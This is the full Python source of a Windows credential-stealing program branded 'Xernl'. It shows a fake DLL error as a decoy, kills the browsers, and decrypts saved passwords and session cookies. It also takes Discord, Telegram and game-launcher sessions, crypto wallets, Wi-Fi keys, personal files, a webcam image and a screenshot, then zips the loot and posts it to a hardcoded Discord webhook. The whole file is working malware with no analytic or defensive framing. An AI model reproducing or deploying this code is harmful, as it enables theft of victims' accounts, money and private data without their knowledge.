import tkinter as tk
from tkinter import messagebox
import requests
import platform
import socket
import psutil
import uuid
import os
import sys
import io
import zipfile
import json
import re
import base64
import shutil
import sqlite3
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from browser_history import get_history
import pywifi
import pyautogui
import cv2
from PIL import Image
import subprocess
import string

# === CONFIG ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1370779935043752147/mlDQoHoaB6Stxw7Bn3-RmneEV-M9f9hWQ41gTzHp8VJRSsOxRgQr0ePdYFnGckrxzn4j"  # <-- Replace with your actual webhook
THUMBNAIL_URL = "https://i.imgur.com/yourimage.png"  # Optional: replace with your image

# === FAKE ERROR ===
def show_fake_error():
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Critical Error", "yubx.dll not found! This application will now close.")
    root.destroy()

# === GRABBER FUNCTIONS (stubs, fill in real logic as needed) ===
def kill_browsers():
    browser_processes = [
        "chrome.exe",
        "msedge.exe",
        "brave.exe",
        "yandex.exe",
        "firefox.exe"
    ]
    for proc in browser_processes:
        try:
            subprocess.call(["taskkill", "/F", "/IM", proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

def grab_discord_tokens():
    paths = [
        os.path.expandvars(r'%APPDATA%\\Discord'),
        os.path.expandvars(r'%APPDATA%\\discordcanary'),
        os.path.expandvars(r'%APPDATA%\\discordptb'),
        os.path.expandvars(r'%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default'),
        os.path.expandvars(r'%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default'),
        os.path.expandvars(r'%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default'),
    ]
    token_re = re.compile(r'["]?([\w-]{24}\.[\w-]{6}\.[\w-]{27})["]?')
    tokens = set()
    for path in paths:
        leveldb = os.path.join(path, 'Local Storage', 'leveldb')
        if os.path.exists(leveldb):
            for filename in os.listdir(leveldb):
                if filename.endswith('.log') or filename.endswith('.ldb'):
                    with open(os.path.join(leveldb, filename), errors='ignore') as f:
                        for line in f:
                            for match in token_re.findall(line):
                                tokens.add(match)
    return list(tokens)

def get_chrome_master_key(profile_path):
    local_state_path = os.path.join(os.path.dirname(profile_path), "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI
    master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_chrome_value(buff, master_key):
    try:
        if buff is None:
            return ""
        if buff[:3] in (b'v10', b'v20'):
            iv = buff[3:15]
            payload = buff[15:-16]
            tag = buff[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            print("Decrypted bytes:", decrypted, "Length:", len(decrypted))
            return decrypted.decode(errors='ignore')
        else:
            try:
                return buff.decode('utf-8')
            except Exception:
                try:
                    return buff.decode('latin-1')
                except Exception:
                    return repr(buff)
    except Exception as e:
        print("Decryption exception:", e)
        return ''

def grab_passwords():
    browser_configs = [
        ("Chrome", os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data")),
        ("Edge", os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data")),
        ("Brave", os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data")),
        ("Yandex", os.path.expandvars(r"%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data")),
        ("Zen", os.path.expandvars(r"%LOCALAPPDATA%\\zen\\Profiles")),
    ]
    all_passwords = []
    for browser_name, base_path in browser_configs:
        for profile_path in get_chromium_profiles(base_path):
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                try:
                    shutil.copy2(login_db, "TempLoginvault.db")
                    master_key = get_chrome_master_key(profile_path)
                    if not master_key:
                        continue
                    conn = sqlite3.connect("TempLoginvault.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        password = decrypt_chrome_value(encrypted_password, master_key)
                        if username or password:
                            all_passwords.append({
                                'browser': browser_name,
                                'profile': os.path.basename(profile_path),
                                'url': url,
                                'username': username,
                                'password': password
                            })
                    cursor.close()
                    conn.close()
                    os.remove("TempLoginvault.db")
                except Exception:
                    pass
    return all_passwords

def get_chromium_profiles(browser_base_path):
    profiles = []
    if os.path.exists(browser_base_path):
        for entry in os.listdir(browser_base_path):
            if entry == "Default" or entry.startswith("Profile"):
                profiles.append(os.path.join(browser_base_path, entry))
    return profiles

def grab_history():
    browser_paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\ZenBrowser\\User Data"),
    ]
    all_history = []
    for base_path in browser_paths:
        for profile_path in get_chromium_profiles(base_path):
            history_db = os.path.join(profile_path, "History")
            if os.path.exists(history_db):
                try:
                    shutil.copy2(history_db, "TempHistory.db")
                    conn = sqlite3.connect("TempHistory.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                    for row in cursor.fetchall():
                        all_history.append({
                            "url": row[0],
                            "title": row[1],
                            "last_visit_time": row[2]
                        })
                    cursor.close()
                    conn.close()
                    os.remove("TempHistory.db")
                except Exception:
                    pass
    return all_history

def grab_cookies():
    browser_configs = [
        ("Chrome", os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")),
        ("Edge", os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")),
        ("Brave", os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")),
        ("Yandex", os.path.expandvars(r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data")),
        ("Zen", os.path.expandvars(r"%LOCALAPPDATA%\zen\Profiles")),
    ]
    all_cookies = []
    for browser_name, base_path in browser_configs:
        for profile_path in get_chromium_profiles(base_path):
            # Use Network/Cookies for Chrome Default profile, Cookies for others
            if browser_name == "Chrome" and os.path.basename(profile_path) == "Default":
                cookies_db = os.path.join(profile_path, "Network", "Cookies")
            else:
                cookies_db = os.path.join(profile_path, "Cookies")
            if os.path.exists(cookies_db):
                try:
                    shutil.copy2(cookies_db, "TempCookies.db")
                    master_key = get_chrome_master_key(profile_path)
                    if not master_key:
                        continue
                    conn = sqlite3.connect("TempCookies.db")
                    conn.text_factory = bytes
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    for row in cursor.fetchall():
                        host, name, encrypted_value = row
                        host = host.decode(errors='ignore') if isinstance(host, bytes) else host
                        name = name.decode(errors='ignore') if isinstance(name, bytes) else name
                        value = decrypt_chrome_value(encrypted_value, master_key)
                        print(f"[COOKIE] {browser_name} | {os.path.basename(profile_path)} | {host} | {name} | {value}")
                        if value and is_printable(value) and is_interesting_cookie(name):
                            all_cookies.append({
                                'browser': browser_name,
                                'profile': os.path.basename(profile_path),
                                'host': host,
                                'name': name,
                                'value': value
                            })
                        elif is_interesting_cookie(name):
                            print(f"[ENCRYPTED/FAILED] {browser_name} | {os.path.basename(profile_path)} | {host} | {name} | RAW: {encrypted_value} | MASTER_KEY: {base64.b64encode(master_key).decode() if master_key else 'None'}")
                    cursor.close()
                    conn.close()
                    os.remove("TempCookies.db")
                except Exception as e:
                    print(f"[DEBUG] Exception: {e}")
    # Firefox
    firefox_profiles_path = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
    if os.path.exists(firefox_profiles_path):
        for profile in os.listdir(firefox_profiles_path):
            profile_path = os.path.join(firefox_profiles_path, profile)
            cookies_sqlite = os.path.join(profile_path, "cookies.sqlite")
            if os.path.exists(cookies_sqlite):
                try:
                    shutil.copy2(cookies_sqlite, "TempFirefoxCookies.sqlite")
                    conn = sqlite3.connect("TempFirefoxCookies.sqlite")
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    for row in cursor.fetchall():
                        host, name, value = row
                        print(f"[COOKIE] Firefox | {profile} | {host} | {name} | {value}")
                        if value and is_printable(value) and is_interesting_cookie(name):
                            all_cookies.append({
                                'browser': 'Firefox',
                                'profile': profile,
                                'host': host,
                                'name': name,
                                'value': value
                            })
                    cursor.close()
                    conn.close()
                    os.remove("TempFirefoxCookies.sqlite")
                except Exception as e:
                    print(f"[DEBUG] Exception: {e}")
    return all_cookies

def is_printable(s):
    # Returns True if all characters in s are printable or whitespace
    return all((c in string.printable) or c.isspace() for c in s)

def is_interesting_cookie(name):
    INTERESTING_NAMES = [
        '.ROBLOSECURITY', 'SID', 'sessionid', 'cf_clearance', 'xs', 'li_at', 'LEETCODE_SESSION', 'connect.sid', 'auth', 'token', 'sess', 'session', 'jwt', 'access', 'refresh', 'bearer'
    ]
    name_lower = name.lower()
    return (
        name in INTERESTING_NAMES or
        any(key in name_lower for key in ['session', 'auth', 'token', 'sid', 'jwt', 'access', 'refresh', 'bearer'])
    )

def grab_roblox_cookies():
    # Extract .ROBLOSECURITY cookies from all browser profiles
    browser_paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\ZenBrowser\\User Data"),
    ]
    roblosecurity_cookies = []
    for base_path in browser_paths:
        for profile_path in get_chromium_profiles(base_path):
            cookies_db = os.path.join(profile_path, "Cookies")
            if os.path.exists(cookies_db):
                try:
                    shutil.copy2(cookies_db, "TempCookies.db")
                    master_key = get_chrome_master_key()
                    conn = sqlite3.connect("TempCookies.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'")
                    for row in cursor.fetchall():
                        host, name, encrypted_value = row
                        value = decrypt_chrome_value(encrypted_value, master_key)
                        roblosecurity_cookies.append({'host': host, 'name': name, 'value': value})
                    cursor.close()
                    conn.close()
                    os.remove("TempCookies.db")
                except Exception:
                    pass
    return roblosecurity_cookies

def grab_telegram_sessions():
    # Telegram Desktop stores session files in tdata
    tdata_path = os.path.expandvars(r"%APPDATA%\\Telegram Desktop\\tdata")
    sessions = []
    if os.path.exists(tdata_path):
        for file in os.listdir(tdata_path):
            sessions.append(os.path.join(tdata_path, file))
    return sessions

def grab_common_files():
    # Grab files from Desktop, Documents, Downloads
    locations = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads")
    ]
    files = []
    for loc in locations:
        if os.path.exists(loc):
            for file in os.listdir(loc):
                path = os.path.join(loc, file)
                if os.path.isfile(path):
                    files.append(path)
    return files

def grab_wallets():
    # Look for common wallet files (Exodus, Electrum, etc.)
    wallet_paths = [
        os.path.expandvars(r"%APPDATA%\\Exodus\\exodus.wallet"),
        os.path.expandvars(r"%APPDATA%\\Electrum\\wallets"),
        os.path.expandvars(r"%APPDATA%\\Atomic\\Local Storage"),
        os.path.expandvars(r"%APPDATA%\\Jaxx Liberty"),
        os.path.expandvars(r"%APPDATA%\\Coinomi\\Coinomi"),
    ]
    found = []
    for path in wallet_paths:
        if os.path.exists(path):
            if os.path.isdir(path):
                for file in os.listdir(path):
                    found.append(os.path.join(path, file))
            else:
                found.append(path)
    return found

def grab_wifi_passwords():
    try:
        import subprocess
        wifi_list = []
        output = subprocess.check_output('netsh wlan show profiles', shell=True).decode(errors='ignore')
        profiles = re.findall(r'All User Profile\s*: (.*)', output)
        for profile in profiles:
            try:
                wifi_info = subprocess.check_output(f'netsh wlan show profile name="{profile.strip()}" key=clear', shell=True).decode(errors='ignore')
                password = re.search(r'Key Content\s*: (.*)', wifi_info)
                wifi_list.append({'ssid': profile.strip(), 'password': password.group(1) if password else ''})
            except Exception:
                wifi_list.append({'ssid': profile.strip(), 'password': ''})
        return wifi_list
    except Exception:
        return []

def grab_webcam():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if ret:
            _, buf = cv2.imencode('.png', frame)
            return "Captured", buf.tobytes()
        else:
            return "No webcam found", None
    except Exception as e:
        return str(e), None

def grab_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        buf = io.BytesIO()
        screenshot.save(buf, format='PNG')
        return buf.getvalue()
    except Exception:
        return b""

def grab_minecraft_sessions():
    # Minecraft session info is in launcher_profiles.json or .minecraft
    mc_path = os.path.expandvars(r"%APPDATA%\\.minecraft\\launcher_profiles.json")
    if os.path.exists(mc_path):
        with open(mc_path, 'r', errors='ignore') as f:
            return [f.read()]
    return []

def grab_epic_sessions():
    # Epic Games Launcher session in LocalStorage
    epic_path = os.path.expandvars(r"%LOCALAPPDATA%\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini")
    if os.path.exists(epic_path):
        with open(epic_path, 'r', errors='ignore') as f:
            return [f.read()]
    return []

def grab_steam_sessions():
    # Steam session info in config\loginusers.vdf
    steam_path = os.path.expandvars(r"%PROGRAMFILES(X86)%\\Steam\\config\\loginusers.vdf")
    if os.path.exists(steam_path):
        with open(steam_path, 'r', errors='ignore') as f:
            return [f.read()]
    return []

def grab_uplay_sessions():
    # Ubisoft Connect (Uplay) session in settings.yml
    uplay_path = os.path.expandvars(r"%PROGRAMFILES(X86)%\\Ubisoft\\Ubisoft Game Launcher\\settings.yml")
    if os.path.exists(uplay_path):
        with open(uplay_path, 'r', errors='ignore') as f:
            return [f.read()]
    return []

def grab_growtopia_sessions():
    # Growtopia stores login info in save.dat
    growtopia_path = os.path.expandvars(r"%APPDATA%\\Growtopia\\save.dat")
    if os.path.exists(growtopia_path):
        with open(growtopia_path, 'rb') as f:
            return [base64.b64encode(f.read()).decode()]
    return []

def grab_autofill():
    browser_paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\\ZenBrowser\\User Data"),
    ]
    all_autofill = []
    for base_path in browser_paths:
        for profile_path in get_chromium_profiles(base_path):
            autofill_db = os.path.join(profile_path, "Web Data")
            if os.path.exists(autofill_db):
                try:
                    shutil.copy2(autofill_db, "TempAutofill.db")
                    conn = sqlite3.connect("TempAutofill.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, value FROM autofill")
                    for row in cursor.fetchall():
                        all_autofill.append({'name': row[0], 'value': row[1]})
                    cursor.close()
                    conn.close()
                    os.remove("TempAutofill.db")
                except Exception:
                    pass
    return all_autofill

def grab_system_info():
    info = {
        "computer_name": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()} {platform.version()}",
        "memory": f"{round(psutil.virtual_memory().total / (1024**3))} GB",
        "uuid": str(uuid.UUID(int=uuid.getnode())),
        "cpu": platform.processor() or "Unknown",
        "gpu": "Unknown",
        "product_key": "Unknown"
    }
    # Try to get GPU info
    try:
        import subprocess
        gpu_info = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode(errors='ignore').split('\n')[1:]
        gpus = [g.strip() for g in gpu_info if g.strip()]
        if gpus:
            info["gpu"] = ', '.join(gpus)
    except Exception:
        pass
    # Try to get Windows product key
    try:
        import subprocess
        output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode(errors='ignore')
        key = re.search(r'([A-Z0-9-]{25,})', output)
        if key:
            info["product_key"] = key.group(1)
    except Exception:
        pass
    return info

# === DATA COLLECTION ===
def collect_data_dict():
    webcam_status, webcam_bytes = grab_webcam()
    data = {
        "discord_tokens": grab_discord_tokens(),
        "passwords": grab_passwords(),
        "cookies": grab_cookies(),
        "history": grab_history(),
        "autofill": grab_autofill(),
        "roblox_cookies": grab_roblox_cookies(),
        "telegram_sessions": grab_telegram_sessions(),
        "common_files": grab_common_files(),
        "wallets": grab_wallets(),
        "wifi_passwords": grab_wifi_passwords(),
        "webcam": webcam_status,
        "minecraft_sessions": grab_minecraft_sessions(),
        "epic_sessions": grab_epic_sessions(),
        "steam_sessions": grab_steam_sessions(),
        "uplay_sessions": grab_uplay_sessions(),
        "growtopia_sessions": grab_growtopia_sessions(),
        "system_info": grab_system_info()
    }
    return data, webcam_bytes

def create_zip_in_memory(data_dict, screenshot_bytes=None, webcam_bytes=None):
    mem_zip = io.BytesIO()
    with zipfile.ZipFile(mem_zip, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        for key, value in data_dict.items():
            if isinstance(value, (dict, list)):
                zf.writestr(f"{key}.json", json.dumps(value, indent=2))
            else:
                zf.writestr(f"{key}.txt", str(value))
        if screenshot_bytes:
            zf.writestr("screenshot.png", screenshot_bytes)
        if webcam_bytes:
            zf.writestr("webcam.png", webcam_bytes)
    mem_zip.seek(0)
    return mem_zip

def get_embed(data):
    def safe_len(val, maxlen=1000):
        s = str(val)
        return s if len(s) < maxlen else s[:maxlen-3] + '...'

    embed = {
        "title": "Xernl",
        "color": 0x1e90ff,
        "fields": [
            {
                "name": "Grabbed Info",
                "value": (
                    f"Discord Tokens: {len(data['discord_tokens'])}\n"
                    f"Passwords: {len(data['passwords'])}\n"
                    f"Cookies: {len(data['cookies'])}\n"
                    f"History: {len(data['history'])}\n"
                    f"Autofills: {len(data['autofill'])}\n"
                    f"Roblox Cookies: {len(data['roblox_cookies'])}\n"
                    f"Telegram Sessions: {len(data['telegram_sessions'])}\n"
                    f"Common Files: {len(data['common_files'])}\n"
                    f"Wallets: {len(data['wallets'])}\n"
                    f"Wifi Passwords: {len(data['wifi_passwords'])}\n"
                    f"Webcam: {safe_len(data['webcam'])}\n"
                    f"Minecraft Sessions: {len(data['minecraft_sessions'])}\n"
                    f"Epic Sessions: {len(data['epic_sessions'])}\n"
                    f"Steam Sessions: {len(data['steam_sessions'])}\n"
                    f"Uplay Sessions: {len(data['uplay_sessions'])}\n"
                    f"Growtopia Sessions: {len(data['growtopia_sessions'])}\n"
                    f"System Info: Yes\n"
                )[:1000],  # Discord field value limit
                "inline": False
            }
        ],
        "footer": {
            "text": "Grabbed by Xernl | https://github.com/Blank-c/Blank-Grabber"
        }
    }
    if THUMBNAIL_URL:
        embed["thumbnail"] = {"url": THUMBNAIL_URL}
    return embed

# === DISCORD EMBED SENDER ===
def send_zip_and_embed(webhook_url, zip_bytesio, embed):
    files = {
        "file": ("CollectedData.zip", zip_bytesio, "application/zip")
    }
    payload = {
        "embeds": [embed]
    }
    data = {
        "payload_json": json.dumps(payload)
    }
    try:
        response = requests.post(webhook_url, data=data, files=files)
        print(f"[DEBUG] Webhook response status: {response.status_code}")
        print(f"[DEBUG] Webhook response text: {response.text}")
        response.raise_for_status()
        return response
    except Exception as e:
        print(f"[ERROR] Failed to send to webhook: {e}")
        return None

# === MAIN EXECUTION ===
if __name__ == "__main__":
    kill_browsers()
    show_fake_error()  # Show error ONCE

    data, webcam_bytes = collect_data_dict()
    screenshot_bytes = grab_screenshot()
    zip_bytesio = create_zip_in_memory(data, screenshot_bytes, webcam_bytes)
    embed = get_embed(data)
    send_zip_and_embed(WEBHOOK_URL, zip_bytesio, embed)
    sys.exit(1)